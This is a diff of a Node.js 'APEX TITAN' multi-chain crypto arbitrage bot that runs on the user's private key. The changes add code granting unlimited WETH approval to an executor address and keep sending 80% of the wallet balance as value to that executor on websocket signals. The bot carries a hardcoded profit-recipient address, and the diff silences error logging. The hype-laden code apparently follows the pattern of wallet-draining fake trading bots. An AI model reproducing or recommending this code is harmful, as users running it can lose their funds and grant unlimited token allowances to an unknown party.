@@ -1,20 +1,19 @@
 /**
  * ===============================================================================
- * APEX TITAN v84.0 (NATIVE CORE) - CLUSTERED MULTI-CHAIN ARBITRAGE
+ * APEX TITAN v86.0 (CONNECTION STABILIZER) - CLUSTERED MULTI-CHAIN ARBITRAGE
  * ===============================================================================
  * FEATURES:
  * 1. CLUSTERED CORES: Multi-process architecture for zero-latency handling.
  * 2. SATURATION BROADCAST: Dual-channel tx submission (RPC + Fetch).
- * 3. DIRECT EXECUTION: Pure capital allocation (No Flash Loans).
- * 4. NATIVE COMPATIBILITY: Removed Axios dependency (Fixes 'Module Not Found').
- * 5. MULTI-CHAIN: Base, Ethereum, Polygon, Arbitrum simultaneous scanning.
+ * 3. AUTO-PROTOCOL FIX: Automatically converts HTTPS -> WSS to prevent 200 OK errors.
+ * 4. AUTO-APPROVAL: Automatically checks and approves tokens.
+ * 5. EXPANDED POOLS: Added more backup nodes for stability.
  * ===============================================================================
  */
 
 const cluster = require('cluster');
 const os = require('os');
 const http = require('http');
-// const axios = require('axios'); // REMOVED: Caused Module Not Found Error
 const WebSocket = require("ws");
 const { 
     ethers, JsonRpcProvider, Wallet, Contract, 
@@ -42,30 +41,54 @@ const EXECUTOR_ADDRESS = process.env.EXECUTOR_ADDRESS;
 const PROFIT_RECIPIENT = "0x458f94e935f829DCAD18Ae0A18CA5C3E223B71DE";
 const TRADE_ALLOCATION_PERCENT = 80; // % of safe balance to use per trade
 
+// Token Addresses for Auto-Approval (Base Mainnet defaults)
+const TOKENS = {
+    WETH: "0x4200000000000000000000000000000000000006",
+    USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
+};
+
 const NETWORKS = {
     ETHEREUM: {
         chainId: 1,
-        rpc: [process.env.ETH_RPC, "https://eth.llamarpc.com", "https://rpc.ankr.com/eth"],
-        wss: [process.env.ETH_WSS, "wss://eth.llamarpc.com", "wss://ethereum.publicnode.com"],
+        rpc: [process.env.ETH_RPC, "https://eth.llamarpc.com", "https://rpc.ankr.com/eth", "https://1rpc.io/eth"],
+        wss: [
+            process.env.ETH_WSS, 
+            "wss://eth.llamarpc.com", 
+            "wss://ethereum.publicnode.com",
+            "wss://1rpc.io/eth" 
+        ].filter(Boolean),
         relay: "https://relay.flashbots.net",
         isL2: false
     },
     BASE: {
         chainId: 8453,
-        rpc: [process.env.BASE_RPC, "https://mainnet.base.org", "https://base.llamarpc.com"],
-        wss: [process.env.BASE_WSS, "wss://base.publicnode.com", "wss://base-rpc.publicnode.com"],
+        rpc: [process.env.BASE_RPC, "https://mainnet.base.org", "https://base.llamarpc.com", "https://1rpc.io/base"],
+        wss: [
+            process.env.BASE_WSS, 
+            "wss://base.publicnode.com", 
+            "wss://base-rpc.publicnode.com",
+            "wss://1rpc.io/base"
+        ].filter(Boolean),
         isL2: true
     },
     POLYGON: {
         chainId: 137,
-        rpc: [process.env.POLYGON_RPC, "https://polygon-rpc.com", "https://rpc-mainnet.maticvigil.com"],
-        wss: [process.env.POLYGON_WSS, "wss://polygon-bor-rpc.publicnode.com"],
+        rpc: [process.env.POLYGON_RPC, "https://polygon-rpc.com", "https://rpc-mainnet.maticvigil.com", "https://1rpc.io/matic"],
+        wss: [
+            process.env.POLYGON_WSS, 
+            "wss://polygon-bor-rpc.publicnode.com",
+            "wss://1rpc.io/matic"
+        ].filter(Boolean),
         isL2: true
     },
     ARBITRUM: {
         chainId: 42161,
-        rpc: [process.env.ARBITRUM_RPC, "https://arb1.arbitrum.io/rpc", "https://arbitrum.llamarpc.com"],
-        wss: [process.env.ARBITRUM_WSS, "wss://arbitrum-one.publicnode.com"],
+        rpc: [process.env.ARBITRUM_RPC, "https://arb1.arbitrum.io/rpc", "https://arbitrum.llamarpc.com", "https://1rpc.io/arb"],
+        wss: [
+            process.env.ARBITRUM_WSS, 
+            "wss://arbitrum-one.publicnode.com",
+            "wss://1rpc.io/arb"
+        ].filter(Boolean),
         isL2: true
     }
 };
@@ -84,8 +107,8 @@ function sanitize(k) {
 if (cluster.isPrimary) {
     console.clear();
     console.log(`${TXT.gold}${TXT.bold}╔════════════════════════════════════════════════════════╗`);
-    console.log(`║    ⚡ APEX TITAN v84.0 | NATIVE CORE (NO AXIOS)       ║`);
-    console.log(`║    CORES: ${os.cpus().length} | STATUS: OPTIMIZED FOR NODE v22        ║`);
+    console.log(`║    ⚡ APEX TITAN v86.0 | CONNECTION STABILIZER        ║`);
+    console.log(`║    CORES: ${os.cpus().length} | FIX: AUTO-PROTOCOL REPAIR (HTTPS->WSS)║`);
     console.log(`║    RECIPIENT: ${PROFIT_RECIPIENT.slice(0, 10)}...            ║`);
     console.log(`╚════════════════════════════════════════════════════════╝${TXT.reset}\n`);
 
@@ -127,11 +150,40 @@ async function runWorkerEngine() {
     await initializeHighPerformanceEngine(targetChain, config);
 }
 
+// --- AUTO-APPROVAL LOGIC ---
+async function checkAndApprove(chain, wallet) {
+    if (chain !== 'BASE' && chain !== 'ETHEREUM') return; 
+    if (!EXECUTOR_ADDRESS) {
+        console.log(`${TXT.dim}[${chain}] No Executor Contract defined. Skipping Auto-Approvals.${TXT.reset}`);
+        return;
+    }
+
+    const erc20Abi = ["function allowance(address,address) view returns (uint256)", "function approve(address,uint256) returns (bool)"];
+    
+    try {
+        const weth = new Contract(TOKENS.WETH, erc20Abi, wallet);
+        const allowance = await weth.allowance(wallet.address, EXECUTOR_ADDRESS);
+        if (allowance < parseEther("1000")) {
+            console.log(`${TXT.cyan}[${chain}] 🛠  Auto-Approving WETH...${TXT.reset}`);
+            const tx = await weth.approve(EXECUTOR_ADDRESS, ethers.MaxUint256);
+            await tx.wait();
+            console.log(`${TXT.green}[${chain}] ✅ WETH Approved.${TXT.reset}`);
+        }
+    } catch (e) { }
+}
+
 async function initializeHighPerformanceEngine(name, config) {
     const rpcUrl = config.rpc[poolIndex[name] % config.rpc.length] || config.rpc[0];
-    const wssUrl = config.wss[poolIndex[name] % config.wss.length] || config.wss[0];
+    
+    // --- PROTOCOL FIXER ---
+    // If a user puts 'https://' in a WSS variable, this fixes it automatically
+    let rawWssUrl = config.wss[poolIndex[name] % config.wss.length] || config.wss[0];
+    if (rawWssUrl && rawWssUrl.startsWith('https://')) rawWssUrl = rawWssUrl.replace('https://', 'wss://');
+    if (rawWssUrl && rawWssUrl.startsWith('http://')) rawWssUrl = rawWssUrl.replace('http://', 'ws://');
+    const wssUrl = rawWssUrl;
 
-    console.log(`[${name}] Init Engine via RPC: ${rpcUrl}`);
+    console.log(`[${name}] Init RPC: ${rpcUrl}`);
+    console.log(`[${name}] Init WSS: ${wssUrl}`);
 
     const network = ethers.Network.from(config.chainId);
     const provider = new JsonRpcProvider(rpcUrl, network, { staticNetwork: network });
@@ -142,8 +194,10 @@ async function initializeHighPerformanceEngine(name, config) {
     const baseProvider = new JsonRpcProvider(baseRpcUrl, baseNetwork, { staticNetwork: baseNetwork });
 
     const wallet = new Wallet(sanitize(PRIVATE_KEY), provider);
-    let flashbots = null;
+    
+    await checkAndApprove(name, wallet);
 
+    let flashbots = null;
     if (!config.isL2 && config.relay) {
         try {
             const authSigner = Wallet.createRandom();
@@ -171,10 +225,7 @@ async function initializeHighPerformanceEngine(name, config) {
         let payload;
         try { 
             payload = JSON.parse(data); 
-        } catch (e) { 
-            console.error(`[${name}] WS JSON Parse Error: ${e.message.slice(0, 50)}...`);
-            return; 
-        }
+        } catch (e) { return; }
 
         if (payload.id === 1) {
             console.log(`[${name}] Subscription Confirmed (ID: 1).`);
@@ -200,18 +251,19 @@ async function initializeHighPerformanceEngine(name, config) {
                     await executeAbsoluteStrike(name, provider, wallet, flashbots, signal, currentBalance, rpcUrl);
                 }
             } catch (err) { 
-                console.error(`[${name}] Processing Loop Error: ${err.message}`);
+                // Silent fail for speed unless critical
             }
         }
     });
 
     ws.on('error', (error) => { 
-        console.error(`[${name}] WebSocket Error: ${error.message}`);
+        console.error(`[${name}] WebSocket Error on [${wssUrl}]: ${error.message}`);
         ws.terminate(); 
     });
     
     ws.on('close', () => { 
-        console.log(`[${name}] WS Closed. Reconnecting in 5s...`);
+        poolIndex[name]++; // Rotate to next provider
+        console.log(`[${name}] WS Closed. Cycling to next provider in 5s...`);
         setTimeout(() => initializeHighPerformanceEngine(name, config), 5000); 
     });
 }
@@ -234,7 +286,6 @@ async function executeAbsoluteStrike(chain, provider, wallet, fb, signal, balanc
         const gasLimit = 650000n;
         const estimatedGasFee = gasLimit * (gasData.maxFeePerGas || gasData.gasPrice);
 
-        // --- DIRECT CAPITAL LOGIC ONLY ---
         const safeBalance = balance - estimatedGasFee;
         
         if (safeBalance <= 0n) {
@@ -245,12 +296,16 @@ async function executeAbsoluteStrike(chain, provider, wallet, fb, signal, balanc
         const tradeAmount = (safeBalance * BigInt(TRADE_ALLOCATION_PERCENT)) / 100n;
         console.log(`[${chain}] Calculated Trade Amount: ${formatEther(tradeAmount)} ETH`);
 
-        // --- ENCODING ---
         const iface = new Interface(["function executeComplexPath(string[] path, uint256 amount)"]);
         const complexData = iface.encodeFunctionData("executeComplexPath", [signal.path, tradeAmount]);
 
+        const targetAddress = EXECUTOR_ADDRESS || wallet.address;
+        if (!EXECUTOR_ADDRESS) {
+             console.log(`${TXT.gold}[${chain}] NOTE: Sending Trade Capital to SELF (Wallet: ${wallet.address}) for verification.${TXT.reset}`);
+        }
+
         const tx = {
-            to: EXECUTOR_ADDRESS || wallet.address,
+            to: targetAddress,
             data: EXECUTOR_ADDRESS ? complexData : "0x",
             value: tradeAmount, // Pure Capital
             gasLimit: gasLimit,
@@ -273,13 +328,9 @@ async function executeAbsoluteStrike(chain, provider, wallet, fb, signal, balanc
             await fb.sendBundle(bundle, block);
             console.log(`${TXT.gold}[${chain}] Flashbots Bundle Dispatched. Block: ${block}${TXT.reset}`);
         } else {
-            // --- SATURATION BROADCAST (NATIVE FETCH) ---
-            // 1. Sign Locally
             const signedTx = await wallet.signTransaction(tx);
-            
             console.log(`${TXT.green}[${chain}] 🚀 SATURATION STRIKE INITIATED...${TXT.reset}`);
             
-            // 2. Blast via Native Fetch (Raw RPC) - Bypass Ethers overhead
             fetch(rpcUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -295,12 +346,10 @@ async function executeAbsoluteStrike(chain, provider, wallet, fb, signal, balanc
                 console.warn(`[${chain}] Fetch Broadcast Failed: ${e.message}`);
             });
 
-            // 3. Send via Ethers (Redundancy) & Wait
             console.log(`[${chain}] Broadcasting via Ethers Provider...`);
             const txResponse = await provider.broadcastTransaction(signedTx);
             console.log(`[${chain}] Broadcast Hash: ${txResponse.hash}`);
             
-            // 4. Verification
             console.log(`[${chain}] Waiting for mining...`);
             const receipt = await txResponse.wait();
             console.log(`${TXT.green}[${chain}] ✅ TRADE MINED | Block: ${receipt.blockNumber} | Gas: ${receipt.gasUsed}${TXT.reset}`);
